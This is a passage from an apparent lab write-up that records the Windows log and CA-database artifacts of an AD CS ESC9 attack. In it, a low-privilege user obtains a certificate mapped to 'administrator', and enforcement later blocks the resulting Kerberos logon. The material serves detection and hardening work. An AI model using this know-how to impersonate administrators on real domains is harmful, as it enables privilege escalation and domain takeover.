0010    34 00 2e 00 31 00 2e 00  33 00 31 00 31 00 2e 00   4...1...3.1.1...
0020    32 00 31 00 2e 00 38 00  2e 00 33 00 39 00 31 00   2.1...8...3.9.1.
0030    34 00 32 00 32 00 33 00  2e 00 31 00 31 00 31 00   4.2.2.3...1.1.1.
0040    35 00 31 00 37 00 34 00  37 00 2e 00 31 00 34 00   5.1.7.4.7...1.4.
0050    34 00 33 00 34 00 39 00  35 00 30 00 2e 00 31 00   4.3.4.9.5.0...1.
0060    31 00 38 00 32 00 31 00  37 00 33 00 2e 00 31 00   1.8.2.1.7.3...1.
0070    35 00 33 00 33 00 38 00  36 00 36 00 36 00 2e 00   5.3.3.8.6.6.6...
0080    32 00 34 00 38 00 2e 00  38 00 30 00 32 00 37 00   2.4.8...8.0.2.7.
0090    38 00 35 00 38 00 37 00  2e 00 36 00 32 00 39 00   8.5.8.7...6.2.9.
00a0    38 00 36 00 36 00 35 00  38 00                     8.6.6.5.8.

  Template Enrollment Flags: 0x80029 (524329)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
      (CT_FLAG_PEND_ALL_REQUESTS -- 2)
      (CT_FLAG_PUBLISH_TO_KRA_CONTAINER -- 4)
    CT_FLAG_PUBLISH_TO_DS -- 8
      (CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16))
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
      (CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT -- 40 (64))
      (CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED -- 80 (128))
      (CT_FLAG_USER_INTERACTION_REQUIRED -- 100 (256))
      (CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512))
      (CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE -- 400 (1024))
      (CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF -- 800 (2048))
      (CT_FLAG_ADD_OCSP_NOCHECK -- 1000 (4096))
      (CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL -- 2000 (8192))
      (CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS -- 4000 (16384))
      (CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS -- 8000 (32768))
      (CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT -- 10000 (65536))
      (CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST -- 20000 (131072))
      (CT_FLAG_SKIP_AUTO_RENEWAL -- 40000 (262144))
    0x80000 (524288)
  Template General Flags: 0x2023a (131642)
      (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1)
    CT_FLAG_ADD_EMAIL -- 2
      (CT_FLAG_ADD_OBJ_GUID -- 4)
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
      (CT_FLAG_MACHINE_TYPE -- 40 (64))
      (CT_FLAG_IS_CA -- 80 (128))
      (CT_FLAG_ADD_DIRECTORY_PATH -- 100 (256))
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
      (CT_FLAG_ADD_SUBJECT_DIRECTORY_PATH -- 400 (1024))
      (CT_FLAG_IS_CROSS_CA -- 800 (2048))
      (CT_FLAG_DONOTPERSISTINDB -- 1000 (4096))
      (CT_FLAG_IS_DEFAULT -- 10000 (65536))
    CT_FLAG_IS_MODIFIED -- 20000 (131072)
      (CT_FLAG_IS_DELETED -- 40000 (262144))
      (CT_FLAG_POLICY_MISMATCH -- 80000 (524288))
  Template Private Key Flags: 0x1010010 (16842768)
      (CTPRIVATEKEY_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL -- 1)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
      (CTPRIVATEKEY_FLAG_STRONG_KEY_PROTECTION_REQUIRED -- 20 (32))
      (CTPRIVATEKEY_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM -- 40 (64))
      (CTPRIVATEKEY_FLAG_REQUIRE_SAME_KEY_RENEWAL -- 80 (128))
      (CTPRIVATEKEY_FLAG_USE_LEGACY_PROVIDER -- 100 (256))
      (CTPRIVATEKEY_FLAG_EK_TRUST_ON_USE -- 200 (512))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_CERT -- 400 (1024))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_KEY -- 800 (2048))
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
      (CTPRIVATEKEY_FLAG_ATTEST_PREFERRED -- 1000 (4096))
      (CTPRIVATEKEY_FLAG_ATTEST_REQUIRED -- 2000 (8192))
      (CTPRIVATEKEY_FLAG_ATTEST_WITHOUT_POLICY -- 4000 (16384))
      (TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0)
    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
      (TEMPLATE_SERVER_VER_2008<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 20000 (131072))
      (TEMPLATE_SERVER_VER_2008R2<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 30000 (196608))
      (TEMPLATE_SERVER_VER_WIN8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 40000 (262144))
      (TEMPLATE_SERVER_VER_WINBLUE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 50000 (327680))
      (TEMPLATE_SERVER_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 60000 (393216))
      (V7<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 70000 (458752))
      (V8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 80000 (524288))
      (V9<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 90000 (589824))
      (V10<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- a0000 (655360))
      (V11<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- b0000 (720896))
      (V12<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- c0000 (786432))
      (V13<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- d0000 (851968))
      (V14<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- e0000 (917504))
      (V15<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- f0000 (983040))
      (CTPRIVATEKEY_FLAG_HELLO_KSP_KEY -- 100000 (1048576))
      (CTPRIVATEKEY_FLAG_HELLO_LOGON_KEY -- 200000 (2097152))
      (TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0)
    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)
      (TEMPLATE_CLIENT_VER_VISTA<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 2000000 (33554432))
      (TEMPLATE_CLIENT_VER_WIN7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 3000000 (50331648))
      (TEMPLATE_CLIENT_VER_WIN8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 4000000 (67108864))
      (TEMPLATE_CLIENT_VER_WINBLUE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 5000000 (83886080))
      (TEMPLATE_CLIENT_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 6000000 (100663296))
      (V7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 7000000 (117440512))
      (V8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 8000000 (134217728))
      (V9<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 9000000 (150994944))
      (V10<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- a000000 (167772160))
      (V11<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- b000000 (184549376))
      (V12<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- c000000 (201326592))
      (V13<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- d000000 (218103808))
      (V14<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- e000000 (234881024))
      (V15<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- f000000 (251658240))
  Serial Number: "2000000055b6d772ba7b06d5ea000000000055"
0000    32 00 30 00 30 00 30 00  30 00 30 00 30 00 30 00   2.0.0.0.0.0.0.0.
0010    35 00 35 00 62 00 36 00  64 00 37 00 37 00 32 00   5.5.b.6.d.7.7.2.
0020    62 00 61 00 37 00 62 00  30 00 36 00 64 00 35 00   b.a.7.b.0.6.d.5.
0030    65 00 61 00 30 00 30 00  30 00 30 00 30 00 30 00   e.a.0.0.0.0.0.0.
0040    30 00 30 00 30 00 30 00  35 00 35 00               0.0.0.0.5.5.

  Issuer Name ID: 0x0 CA Version 0.0
  Certificate Effective Date: 8/17/2025 6:25 PM GMT
  Certificate Expiration Date: 8/17/2026 6:25 PM GMT
  Issued Subject Key Identifier: "06 2f 87 bd ed fb 34 56 dd 00 b4 7d 8e b7 57 f0 59 d2 9d e6"
0000    30 00 36 00 20 00 32 00  66 00 20 00 38 00 37 00   0.6. .2.f. .8.7.
0010    20 00 62 00 64 00 20 00  65 00 64 00 20 00 66 00    .b.d. .e.d. .f.
0020    62 00 20 00 33 00 34 00  20 00 35 00 36 00 20 00   b. .3.4. .5.6. .
0030    64 00 64 00 20 00 30 00  30 00 20 00 62 00 34 00   d.d. .0.0. .b.4.
0040    20 00 37 00 64 00 20 00  38 00 65 00 20 00 62 00    .7.d. .8.e. .b.
0050    37 00 20 00 35 00 37 00  20 00 66 00 30 00 20 00   7. .5.7. .f.0. .
0060    35 00 39 00 20 00 64 00  32 00 20 00 39 00 64 00   5.9. .d.2. .9.d.
0070    20 00 65 00 36 00                                   .e.6.

  Binary Public Key:
0000    30 82 01 0a 02 82 01 01  00 90 df 4a 74 fa ae bd
0010    31 93 0d 9c 02 1d 7a 4a  ae 9f 45 8e f5 84 b5 c6
0020    50 bc a9 a8 2a 36 dd f2  07 f3 56 a2 82 cf a3 10
0030    7d 14 45 33 44 01 2a 6d  09 78 22 19 fd e0 71 16
0040    ba 66 5d 1e 3a 8a 9c 76  3a 52 06 8d 52 6c 03 74
0050    3b 36 ad e8 be d7 dc f5  c6 75 1c dd 21 c4 c6 6f
0060    4f 27 d4 37 96 9b 96 79  37 7e b2 a8 63 3b e3 5a
0070    9f f1 f3 fb cb dd 0c 9a  04 78 3e 58 1e 18 1e df
0080    14 37 31 cd 6e c3 26 ad  c5 2a 4f 00 cd 26 d1 2a
0090    b8 95 33 77 8e 96 8a a9  a8 ba 20 15 2f 68 ce b9
00a0    71 07 c9 79 c6 d4 bf 95  a6 28 1d 2a b9 5b be fa
00b0    02 5f 03 20 56 75 7a 49  d4 fd 34 13 8a 5c 47 38
00c0    df 8f 8d db da ee a9 33  69 ca d4 4b 28 a7 c4 5d
00d0    2d 2c 40 b4 73 66 dc df  d0 c5 8e 89 cd c8 dc ee
00e0    19 ed a1 ad 53 d6 b5 c8  9d 94 80 97 24 8c 57 85
00f0    5e e0 81 4f e5 a2 af 55  52 f4 1e 4c ba da ae 78
0100    d9 3f 2b 59 2c fa 4f 2d  c7 02 03 01 00 01

  Public Key Length: 0x800 (2048)
  Public Key Algorithm: "1.2.840.113549.1.1.1" RSA (RSA_SIGN)
0000    31 00 2e 00 32 00 2e 00  38 00 34 00 30 00 2e 00   1...2...8.4.0...
0010    31 00 31 00 33 00 35 00  34 00 39 00 2e 00 31 00   1.1.3.5.4.9...1.
0020    2e 00 31 00 2e 00 31 00                            ..1...1.

  Public Key Algorithm Parameters:
0000    05 00                                              ..

  Publish Expired Certificate in CRL: 0x0
  User Principal Name: "administrator"
0000    61 00 64 00 6d 00 69 00  6e 00 69 00 73 00 74 00   a.d.m.i.n.i.s.t.
0010    72 00 61 00 74 00 6f 00  72 00                     r.a.t.o.r.

  Issued Distinguished Name: EMPTY
  Issued Binary Name:
0000    30 00                                              0.

  Issued Country/Region: EMPTY
  Issued Organization: EMPTY
  Issued Organization Unit: EMPTY
  Issued Common Name: EMPTY
  Issued City: EMPTY
  Issued State: EMPTY
  Issued Title: EMPTY
  Issued First Name: EMPTY
  Issued Initials: EMPTY
  Issued Last Name: EMPTY
  Issued Domain Component: EMPTY
  Issued Email Address: EMPTY
  Issued Street Address: EMPTY
  Issued Unstructured Name: EMPTY
  Issued Unstructured Address: EMPTY
  Issued Device Serial Number: EMPTY

Maximum Row Index: 1

1 Rows
  34 Row Properties, Total Size = 3245, Max Size = 1474, Ave Size = 95
   0 Request Attributes, Total Size = 0, Max Size = 0, Ave Size = 0
   0 Certificate Extensions, Total Size = 0, Max Size = 0, Ave Size = 0
  34 Total Fields, Total Size = 3245, Max Size = 1474, Ave Size = 95
CertUtil: -view command completed successfully.
```

</details>    

### Get-Request output

```bash
CA                                          : braavos.essos.local\ESSOS-CA
Request.ID                                  : 85
Request.RequesterName                       : ESSOS\viserys.targaryen
Request.CommonName                          : Viserys.targaryen
Request.CallerName                          : ESSOS\viserys.targaryen
Request.DistinguishedName                   : CN=Viserys.targaryen
Request.ClientInformation.MachineName       :
Request.ClientInformation.ProcessName       :
Request.ClientInformation.UserName          :
Request.SubjectAltNamesExtension            :
Request.SubjectAltNamesAttrib               :
Request.ApplicationPolicies                 :
UPN                                         : administrator
Issued.DistinguishedName                    :
Issued.CommonName                           :
CertificateTemplate                         : ESC9 (1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658)
EnrollmentFlags                             : {CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS, CT_FLAG_NO_SECURITY_EXTENSION, CT_FLAG_AUTO_ENROLLMENT, CT_FLAG_PUBLISH_TO_DS}
SerialNumber                                : 2000000055b6d772ba7b06d5ea000000000055
Certificate.SAN                             : Other Name:Principal Name=administrator
Certificate.ApplicationPolicies             : [1]Application Certificate Policy:Policy Identifier=Client Authentication, [2]Application Certificate Policy:Policy Identifier=Secure Email, [3]Application Certificate Policy:Policy Identifier=Encrypting File System
Certificate.IssuancePolicies.PolicyName     :
Certificate.IssuancePolicies.GroupCN        :
Certificate.IssuancePolicies.GroupSID       :
Certificate.EKU                             : Client Authentication (1.3.6.1.5.5.7.3.2), Secure Email (1.3.6.1.5.5.7.3.4), Encrypting File System (1.3.6.1.4.1.311.10.3.4)
Certificate.SID_Extension.SID               :
Certificate.SID_Extension.DistinguishedName :
Certificate.SID_Extension.SamAccountName    :
Certificate.SID_Extension.UPN               :
Certificate.SID_Extension.CN                :
RequestDate                                 : 8/17/2025 6:35:35 PM
StartDate                                   : 8/17/2025 6:25:35 PM
EndDate                                     : 8/17/2026 6:25:35 PM
```

## StrongCertificateBindingEnforcement=2

### System event 39 Error

```
The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way (such as via explicit mapping, key trust mapping, or a SID). Such certificates should either be replaced or mapped directly to the user via explicit mapping. See https://go.microsoft.com/fwlink/?linkid=2189925 to learn more.

  User: Administrator
  Certificate Subject: 
  Certificate Issuer: ESSOS-CA
  Certificate Serial Number: 200000002D8D36C22BD8DD7C7D00000000002D
  Certificate Thumbprint: E6C0A6767C34D77A8378AD72FDE10AFB98CAF1CE
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Kerberos-Key-Distribution-Center" Guid="{3FD9DA1A-5A54-46C5-9A26-9BD7C0685056}" EventSourceName="KDC" /> 
  <EventID Qualifiers="32768">39</EventID> 
  <Version>0</Version> 
  <Level>2</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-07T21:01:13.699831600Z" /> 
  <EventRecordID>5637</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="0" ThreadID="0" /> 
  <Channel>System</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="AccountName">Administrator</Data> 
  <Data Name="Subject" /> 
  <Data Name="Issuer">ESSOS-CA</Data> 
  <Data Name="SerialNumber">200000002D8D36C22BD8DD7C7D00000000002D</Data> 
  <Data Name="Thumbprint">E6C0A6767C34D77A8378AD72FDE10AFB98CAF1CE</Data> 
  <Binary /> 
  </EventData>
  </Event>
```

### 4768 Failed TGT Request (KRB_AP_ERR_USER_TO_USER_REQUIRED)

```
A Kerberos authentication ticket (TGT) was requested.

Account Information:
    Account Name:		administrator
    Supplied Realm Name:	ESSOS.LOCAL
    User ID:			NULL SID
    MSDS-SupportedEncryptionTypes:	-
    Available Keys:	-

Service Information:
    Service Name:		krbtgt/ESSOS.LOCAL
    Service ID:		NULL SID
    MSDS-SupportedEncryptionTypes:	-
    Available Keys:	-

Domain Controller Information:
    MSDS-SupportedEncryptionTypes:	-
    Available Keys:	-

Network Information:
    Client Address:		::ffff:192.168.56.101
    Client Port:		60020
    Advertized Etypes:	-

Additional Information:
    Ticket Options:		0x40800010
    Result Code:		0x42
    Ticket Encryption Type:	0xFFFFFFFF
    Session Encryption Type:	0x2D
    Pre-Authentication Type:	-
    Pre-Authentication EncryptionType:	0x2D

Certificate Information:
    Certificate Issuer Name:		ESSOS-CA
    Certificate Serial Number:	200000002D8D36C22BD8DD7C7D00000000002D
    Certificate Thumbprint:		E6C0A6767C34D77A8378AD72FDE10AFB98CAF1CE

Ticket information
    Response ticket hash:		-
Certificate information is only provided if a certificate was used for pre-authentication.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4768</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>14339</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8010000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-07T21:01:13.704646000Z" /> 
  <EventRecordID>92565</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="688" ThreadID="1784" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TargetUserName">administrator</Data> 
  <Data Name="TargetDomainName">ESSOS.LOCAL</Data> 
  <Data Name="TargetSid">S-1-0-0</Data> 
  <Data Name="ServiceName">krbtgt/ESSOS.LOCAL</Data> 
  <Data Name="ServiceSid">S-1-0-0</Data> 
  <Data Name="TicketOptions">0x40800010</Data> 
  <Data Name="Status">0x42</Data> 
  <Data Name="TicketEncryptionType">0xffffffff</Data> 
  <Data Name="PreAuthType">-</Data> 
  <Data Name="IpAddress">::ffff:192.168.56.101</Data> 
  <Data Name="IpPort">60020</Data> 
  <Data Name="CertIssuerName">ESSOS-CA</Data> 
  <Data Name="CertSerialNumber">200000002D8D36C22BD8DD7C7D00000000002D</Data> 
  <Data Name="CertThumbprint">E6C0A6767C34D77A8378AD72FDE10AFB98CAF1CE</Data> 
  <Data Name="ResponseTicket">-</Data> 
  <Data Name="AccountSupportedEncryptionTypes">-</Data> 
  <Data Name="AccountAvailableKeys">-</Data> 
  <Data Name="ServiceSupportedEncryptionTypes">-</Data> 
  <Data Name="ServiceAvailableKeys">-</Data> 
  <Data Name="DCSupportedEncryptionTypes">-</Data> 
  <Data Name="DCAvailableKeys">-</Data> 
  <Data Name="ClientAdvertizedEncryptionTypes">-</Data> 
  <Data Name="SessionKeyEncryptionType">0x2d</Data> 
  <Data Name="PreAuthEncryptionType">0x2d</Data> 
  </EventData>
  </Event>
```

